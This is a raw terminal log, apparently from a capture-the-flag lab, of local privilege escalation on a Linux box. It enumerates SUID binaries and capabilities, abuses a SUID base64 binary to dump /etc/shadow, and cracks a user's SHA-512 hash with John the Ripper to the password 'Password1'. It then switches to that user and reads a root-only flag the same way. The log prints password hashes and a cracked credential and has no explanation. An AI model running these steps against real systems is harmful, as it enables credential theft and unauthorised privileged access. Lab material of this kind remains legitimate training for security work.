systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
colord:x:998:995:User for colord:/var/lib/colord:/sbin/nologin
unbound:x:997:994:Unbound DNS resolver:/etc/unbound:/sbin/nologin
libstoragemgmt:x:996:993:daemon account for libstoragemgmt:/var/run/lsm:/sbin/nologin
saslauth:x:995:76:Saslauthd user:/run/saslauthd:/sbin/nologin
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
gluster:x:994:992:GlusterFS daemons:/run/gluster:/sbin/nologin
abrt:x:173:173::/etc/abrt:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
setroubleshoot:x:993:990::/var/lib/setroubleshoot:/sbin/nologin
rtkit:x:172:172:RealtimeKit:/proc:/sbin/nologin
pulse:x:171:171:PulseAudio System Daemon:/var/run/pulse:/sbin/nologin
radvd:x:75:75:radvd user:/:/sbin/nologin
chrony:x:992:987::/var/lib/chrony:/sbin/nologin
saned:x:991:986:SANE scanner daemon user:/usr/share/sane:/sbin/nologin
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
qemu:x:107:107:qemu user:/:/sbin/nologin
ntp:x:38:38::/etc/ntp:/sbin/nologin
tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
sssd:x:990:984:User for sssd:/:/sbin/nologin
usbmuxd:x:113:113:usbmuxd user:/:/sbin/nologin
geoclue:x:989:983:User for geoclue:/var/lib/geoclue:/sbin/nologin
gdm:x:42:42::/var/lib/gdm:/sbin/nologin
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
gnome-initial-setup:x:988:982::/run/gnome-initial-setup/:/sbin/nologin
pcp:x:987:981:Performance Co-Pilot:/var/lib/pcp:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
avahi:x:70:70:Avahi mDNS/DNS-SD Stack:/var/run/avahi-daemon:/sbin/nologin
oprofile:x:16:16:Special user account to be used by OProfile:/var/lib/oprofile:/sbin/nologin
tcpdump:x:72:72::/:/sbin/nologin
leonard:x:1000:1000:leonard:/home/leonard:/bin/bash
mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin
smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin
nscd:x:28:28:NSCD Daemon:/:/sbin/nologin
missy:x:1001:1001::/home/missy:/bin/bash
[leonard@ip-10-10-200-231 ~]$ cat /etc/shadow
cat: /etc/shadow: Permission denied
[leonard@ip-10-10-200-231 ~]$ find / -type f -perm -04000 -ls 2>/dev/null
16779966   40 -rwsr-xr-x   1 root     root        37360 Aug 20  2019 /usr/bin/base64
17298702   60 -rwsr-xr-x   1 root     root        61320 Sep 30  2020 /usr/bin/ksu
17261777   32 -rwsr-xr-x   1 root     root        32096 Oct 30  2018 /usr/bin/fusermount
17512336   28 -rwsr-xr-x   1 root     root        27856 Apr  1  2020 /usr/bin/passwd
17698538   80 -rwsr-xr-x   1 root     root        78408 Aug  9  2019 /usr/bin/gpasswd
17698537   76 -rwsr-xr-x   1 root     root        73888 Aug  9  2019 /usr/bin/chage
17698541   44 -rwsr-xr-x   1 root     root        41936 Aug  9  2019 /usr/bin/newgrp
17702679  208 ---s--x---   1 root     stapusr    212080 Oct 13  2020 /usr/bin/staprun
17743302   24 -rws--x--x   1 root     root        23968 Sep 30  2020 /usr/bin/chfn
17743352   32 -rwsr-xr-x   1 root     root        32128 Sep 30  2020 /usr/bin/su
17743305   24 -rws--x--x   1 root     root        23880 Sep 30  2020 /usr/bin/chsh
17831141 2392 -rwsr-xr-x   1 root     root      2447304 Apr  1  2020 /usr/bin/Xorg
17743338   44 -rwsr-xr-x   1 root     root        44264 Sep 30  2020 /usr/bin/mount
17743356   32 -rwsr-xr-x   1 root     root        31984 Sep 30  2020 /usr/bin/umount
17812176   60 -rwsr-xr-x   1 root     root        57656 Aug  9  2019 /usr/bin/crontab
17787689   24 -rwsr-xr-x   1 root     root        23576 Apr  1  2020 /usr/bin/pkexec
18382172   52 -rwsr-xr-x   1 root     root        53048 Oct 30  2018 /usr/bin/at
20386935  144 ---s--x--x   1 root     root       147336 Sep 30  2020 /usr/bin/sudo
34469385   12 -rwsr-xr-x   1 root     root        11232 Apr  1  2020 /usr/sbin/pam_timestamp_check
34469387   36 -rwsr-xr-x   1 root     root        36272 Apr  1  2020 /usr/sbin/unix_chkpwd
36070283   12 -rwsr-xr-x   1 root     root        11296 Oct 13  2020 /usr/sbin/usernetctl
35710927   40 -rws--x--x   1 root     root        40328 Aug  9  2019 /usr/sbin/userhelper
38394204  116 -rwsr-xr-x   1 root     root       117432 Sep 30  2020 /usr/sbin/mount.nfs
958368   16 -rwsr-xr-x   1 root     root        15432 Apr  1  2020 /usr/lib/polkit-1/polkit-agent-helper-1
37709347   12 -rwsr-xr-x   1 root     root        11128 Oct 13  2020 /usr/libexec/kde4/kpac_dhcp_helper
51455908   60 -rwsr-x---   1 root     dbus        57936 Sep 30  2020 /usr/libexec/dbus-1/dbus-daemon-launch-helper
17836404   16 -rwsr-xr-x   1 root     root        15448 Apr  1  2020 /usr/libexec/spice-gtk-x86_64/spice-client-glib-usb-acl-helper
18393221   16 -rwsr-xr-x   1 root     root        15360 Oct  1  2020 /usr/libexec/qemu-bridge-helper
37203442  156 -rwsr-x---   1 root     sssd       157872 Oct 15  2020 /usr/libexec/sssd/krb5_child
37203771   84 -rwsr-x---   1 root     sssd        82448 Oct 15  2020 /usr/libexec/sssd/ldap_child
37209171   52 -rwsr-x---   1 root     sssd        49592 Oct 15  2020 /usr/libexec/sssd/selinux_child
37209165   28 -rwsr-x---   1 root     sssd        27792 Oct 15  2020 /usr/libexec/sssd/proxy_child
18270608   16 -rwsr-sr-x   1 abrt     abrt        15344 Oct  1  2020 /usr/libexec/abrt-action-install-debuginfo-to-abrt-cache
18535928   56 -rwsr-xr-x   1 root     root        53776 Mar 18  2020 /usr/libexec/flatpak-bwrap
[leonard@ip-10-10-200-231 ~]$ getcap -r / 2>/dev/null
/usr/bin/newgidmap = cap_setgid+ep
/usr/bin/newuidmap = cap_setuid+ep
/usr/bin/ping = cap_net_admin,cap_net_raw+p
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/sbin/arping = cap_net_raw+p
/usr/sbin/clockdiff = cap_net_raw+p
/usr/sbin/mtr = cap_net_raw+ep
/usr/sbin/suexec = cap_setgid,cap_setuid+ep
[leonard@ip-10-10-200-231 ~]$ cat /etc/crontab
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root

# For details see man 4 crontabs

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name  command to be executed

$ LFILE=/etc/shadow
$ /usr/bin/base64 "$LFILE" | base64 --decode
root:$6$DWBzMoiprTTJ4gbW$g0szmtfn3HYFQweUPpSUCgHXZLzVii5o6PM0Q2oMmaDD9oGUSxe1yvKbnYsaSYHrUEQXTjIwOW/yrzV5HtIL51::0:99999:7:::
bin:*:18353:0:99999:7:::
daemon:*:18353:0:99999:7:::
adm:*:18353:0:99999:7:::
lp:*:18353:0:99999:7:::
sync:*:18353:0:99999:7:::
shutdown:*:18353:0:99999:7:::
halt:*:18353:0:99999:7:::
mail:*:18353:0:99999:7:::
operator:*:18353:0:99999:7:::
games:*:18353:0:99999:7:::
ftp:*:18353:0:99999:7:::
nobody:*:18353:0:99999:7:::
pegasus:!!:18785::::::
systemd-network:!!:18785::::::
dbus:!!:18785::::::
polkitd:!!:18785::::::
colord:!!:18785::::::
unbound:!!:18785::::::
libstoragemgmt:!!:18785::::::
saslauth:!!:18785::::::
rpc:!!:18785:0:99999:7:::
gluster:!!:18785::::::
abrt:!!:18785::::::
postfix:!!:18785::::::
setroubleshoot:!!:18785::::::
rtkit:!!:18785::::::
pulse:!!:18785::::::
radvd:!!:18785::::::
chrony:!!:18785::::::
saned:!!:18785::::::
apache:!!:18785::::::
qemu:!!:18785::::::
ntp:!!:18785::::::
tss:!!:18785::::::
sssd:!!:18785::::::
usbmuxd:!!:18785::::::
geoclue:!!:18785::::::
gdm:!!:18785::::::
rpcuser:!!:18785::::::
nfsnobody:!!:18785::::::
gnome-initial-setup:!!:18785::::::
pcp:!!:18785::::::
sshd:!!:18785::::::
avahi:!!:18785::::::
oprofile:!!:18785::::::
tcpdump:!!:18785::::::
leonard:$6$JELumeiiJFPMFj3X$OXKY.N8LDHHTtF5Q/pTCsWbZtO6SfAzEQ6UkeFJy.Kx5C9rXFuPr.8n3v7TbZEttkGKCVj50KavJNAm7ZjRi4/::0:99999:7:::
mailnull:!!:18785::::::
smmsp:!!:18785::::::
nscd:!!:18785::::::
missy:$6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/:18785:0:99999:7:::

┌──(kali㉿kali)-[~]
└─$ john missy                                                                                                                                                         1 ⨯
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
Password1        (?)     
1g 0:00:00:01 DONE 2/3 (2021-11-28 04:33) 0.6896g/s 2648p/s 2648c/s 2648C/s password..Skippy
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

[leonard@ip-10-10-200-231 ~]$ su missy
Password: 
[missy@ip-10-10-200-231 leonard]$ id
uid=1001(missy) gid=1001(missy) groups=1001(missy) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[missy@ip-10-10-200-231 leonard]$ pwd
/home/leonard
[missy@ip-10-10-200-231 leonard]$ cd /home/missy
[missy@ip-10-10-200-231 ~]$ ls
Desktop  Documents  Downloads  Music  perl5  Pictures  Public  Templates  Videos
[missy@ip-10-10-200-231 ~]$ cd Documents
[missy@ip-10-10-200-231 Documents]$ ls
flag1.txt
[missy@ip-10-10-200-231 Documents]$ cat flag1.txt
THM-42828719920544

[missy@ip-10-10-200-231 ~]$ cd ..
[missy@ip-10-10-200-231 home]$ ls
leonard  missy  rootflag
[missy@ip-10-10-200-231 home]$ cd rootflag
bash: cd: rootflag: Permission denied
[missy@ip-10-10-200-231 home]$ LFILE=/home/rootflag/flag2.txt
[missy@ip-10-10-200-231 home]$ /usr/bin/base64 "$LFILE" | base64 --decode
THM-168824782390238
